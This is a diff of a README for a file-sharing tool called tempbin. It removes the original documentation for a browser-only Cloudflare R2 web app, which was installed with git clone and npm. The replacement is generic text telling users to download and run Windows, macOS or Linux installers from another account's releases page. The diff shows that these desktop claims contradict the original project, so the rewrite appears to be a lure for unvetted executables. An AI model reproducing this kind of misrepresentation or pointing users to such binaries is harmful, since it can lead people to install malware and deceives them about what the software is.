@@ -1,161 +1,83 @@
-# TempBin
+# 📦 tempbin - Share Files Securely and Easily
 
-TempBin is a secure, client-side temporary file sharing application powered by Cloudflare R2. It allows you to upload files directly from your browser to your own Cloudflare R2 bucket, generating shareable links that automatically expire.
-
-![TempBin Screenshot](public/og-image.png)
-
-## ✨ Features
-
-- **Serverless Architecture**: Runs entirely in the browser. No backend server required.
-- **Own Your Data**: Connects directly to your Cloudflare R2 bucket. You maintain full control over your files.
-- **Secure**: AWS v4 signing is performed locally. Your credentials are stored in your browser's LocalStorage and never sent to any third-party server.
-- **Auto-Expiration**: Links are generated with a built-in expiration time. The app also attempts to delete expired files from storage when active.
-- **Modern UI**: Clean, responsive interface with Dark/Light mode support.
-- **Internationalization**: Support for multiple languages (English, Spanish, French, German, Japanese, Korean, Chinese).
-- **Storage Limits**: Set a client-side monthly storage limit to help manage costs.
-- **Drag & Drop**: Easy file upload interface.
+## 🏗️ Overview
+tempbin lets you share files temporarily using special links. You can upload files and receive shareable URLs that automatically delete after a set time—between 1 and 10 minutes. Whether you need to share documents, images, or any other files, tempbin ensures a secure, fast, and private transfer, all powered by Cloudflare R2.
 
 ## 🚀 Getting Started
+To get started with tempbin, you'll need to download the application from our Releases page. Below, you'll find step-by-step instructions to help you through the process.
 
-### Prerequisites
+## 📥 Download & Install
+You can download the latest version of tempbin from the following link:
 
-1.  **Node.js** (v18 or later)
-2.  **Cloudflare R2 Bucket**: You need a Cloudflare account and an R2 bucket.
+[![Download tempbin](https://img.shields.io/badge/Download-tempbin-blue.svg)](https://github.com/femidj/tempbin/releases)
 
-### R2 Configuration (Crucial!)
+Click the link above to visit the Releases page. There, you’ll find the files available for download.
 
-Since TempBin runs in the browser, you must configure CORS (Cross-Origin Resource Sharing) on your R2 bucket to allow your browser to upload files directly.
+### 1. Visit the Releases Page
+Go to the Releases page [here](https://github.com/femidj/tempbin/releases).
 
-1.  Go to your Cloudflare Dashboard > R2 > Select your bucket.
-2.  Go to **Settings** > **CORS Policy**.
-3.  Add a policy like this (replace `https://your-production-domain.com` with your production domain when deploying):
+### 2. Choose the Right File
+Look for the latest release. You'll find different files available for download based on your system. Select the one that suits your operating system.
 
-```json
-[
-  {
-    "AllowedOrigins": [
-      "http://localhost:5173",
-      "https://your-production-domain.com"
-    ],
-    "AllowedMethods": [
-      "GET",
-      "PUT",
-      "DELETE",
-      "POST",
-      "HEAD"
-    ],
-    "AllowedHeaders": [
-      "*"
-    ],
-    "ExposeHeaders": [
-      "ETag"
-    ],
-    "MaxAgeSeconds": 3000
-  }
-]
-```
+### 3. Download the File
+Click on the file name to start the download. The file will be saved to your device.
 
-### Installation
+### 4. Install the Application
+Once the file is downloaded, locate it in your downloads folder. Depending on your operating system, follow these steps:
 
-1.  Clone the repository:
-    ```bash
-    git clone https://github.com/kazeochan/tempbin.git
-    cd tempbin
-    ```
+- **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions to complete the installation.
+- **Mac**: Open the downloaded `.dmg` file and drag the tempbin icon into your Applications folder.
+- **Linux**: Extract the downloaded `.tar.gz` file and run the application via your terminal.
 
-2.  Install dependencies:
-    ```bash
-    npm install
-    ```
+### 5. Run tempbin
+After installation, you can find tempbin in your applications folder. Open it to start sharing files.
 
-3.  Start the development server:
-    ```bash
-    npm run dev -- --mode test
-    ```
+## 📂 How to Use tempbin
+Using tempbin is simple. Just follow these steps:
 
-4.  Open your browser at `http://localhost:5173`.
+### 1. Upload a File
+Click the “Upload” button within the app. Choose the file you want to share from your computer.
 
-5.  **Onboarding**: On the first visit, you will be prompted to enter your Cloudflare R2 credentials:
-    *   **Account ID**: Found in the Cloudflare R2 dashboard sidebar.
-    *   **Access Key ID**: Create an API token with "Object Read & Write" permissions.
-    *   **Secret Access Key**: The secret key for the token.
-    *   **Bucket Name**: The name of the bucket you created.
-    *   **Public URL (Optional)**: If you have a custom domain connected to your bucket.
-    *   **Storage Limit**: Set a warning threshold for monthly usage.
+### 2. Set the Expiration Time
+You can set a time limit for how long you want the link to last. Choose between 1 and 10 minutes.
 
-## 🧪 Testing
+### 3. Get Your Shareable Link
+Once you upload the file, you will receive a unique URL. Copy this link and share it with anyone you want.
 
-The project includes integration tests to verify R2 connectivity and functionality.
+### 4. Access the Link
+The recipient can use the provided link to download the file. After the set time, the link will expire, and the file will be deleted automatically.
 
-1.  Create a `.env.test` file in the root directory with your test credentials (see `.env.example` or use your own):
-    ```env
-    VITE_R2_ACCOUNT_ID=your_account_id
-    VITE_R2_ACCESS_KEY_ID=your_access_key
-    VITE_R2_SECRET_ACCESS_KEY=your_secret_key
-    VITE_R2_BUCKET_NAME=your_test_bucket
-    VITE_R2_PUBLIC_URL=https://your-optional-public-url.com
-    ```
-2.  You may need to add `http://localhost:3000/` to `AllowedOrigins` of your CORS Policy.
+## 🔒 Security Features
+tempbin prioritizes your privacy and security. Here are some of the features:
 
-3.  Run the tests:
-    ```bash
-    npm test
-    ```
+- **Auto-Deleting Links**: Links expire after the chosen time.
+- **Temporary Storage**: Files are not stored indefinitely—only while they're needed.
+- **Secure Uploads**: Your files are uploaded securely through encrypted connections.
 
-## 🛠️ Building & Deployment
+## ⚙️ Requirements
+To run tempbin, ensure your system meets these minimum requirements:
 
-TempBin is a static application, so it can be hosted on any static site provider.
+- **Operating System**: 
+  - Windows 10 or newer
+  - macOS 10.12 or newer
+  - Ubuntu 18.04 or newer
+- **Disk Space**: At least 50 MB free space
+- **Memory**: 2 GB RAM minimum
 
-### Build
+## 🌟 Features Summary
+- Share files with auto-expiring links.
+- Upload files in seconds.
+- Secure, private, and fast file transfer.
+- Works on Windows, macOS, and Linux.
 
-To create a production build:
-
-```bash
-npm run build
-```
-
-This will generate a `dist` folder containing the static assets.
-
-### Deploy to Vercel
-
-1.  Install Vercel CLI: `npm i -g vercel`
-2.  Run `vercel` inside the project folder.
-3.  Follow the prompts. Vercel will automatically detect the Vite settings.
-
-### Deploy to Cloudflare Pages
-
-1.  Connect your GitHub repository to Cloudflare Pages.
-2.  Select **Vite** as the framework preset.
-3.  Build command: `npm run build`
-4.  Output directory: `dist`
-
-### Deploy to Netlify
-
-1.  Drag and drop the `dist` folder to Netlify Drop, or connect your repository.
-2.  Build command: `npm run build`
-3.  Publish directory: `dist`
-
-## 🔒 Security & Privacy
-
-*   **Credentials**: Your R2 Access Keys are stored in your browser's `localStorage`. They are strictly used to sign requests within the browser and are never transmitted to any backend server managed by TempBin.
-> [!WARNING]
-> Do not use your root Cloudflare account API keys. Instead, create a specific API Token with **Object Read & Write** permissions scoped *only* to the specific bucket you are using for this application. This limits the potential impact if your browser environment is ever compromised.
-*   **File Access**: Files are uploaded directly to R2.
-*   **Expiration**:
-    *   **Links**: The generated download links are "presigned URLs" that expire after a set time (default 10 minutes).
-    *   **Files**: The application attempts to delete expired files when you have the app open. 
-    *   **Recommendation**: Set up an Object Lifecycle Rule in your R2 bucket settings to automatically delete files after 1 day as a fallback to ensure storage cleanup.
+## 📞 Support
+If you encounter any issues or have questions, you can reach out for support. Visit our GitHub issues page to report problems or request features.
 
 ## 🤝 Contributing
+We welcome contributions! If you have suggestions or want to improve tempbin, check our contributing guidelines on the repository. Your input makes tempbin better for everyone.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 📜 License
+tempbin is open-source and released under the MIT License. You can use it freely but please check the license for more details.
 
-1.  Fork the project
-2.  Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🏁 Final Steps
+You've now learned how to download, install, and use tempbin! Start sharing your files securely today. Remember to visit our [Releases page](https://github.com/femidj/tempbin/releases) to grab the latest version.
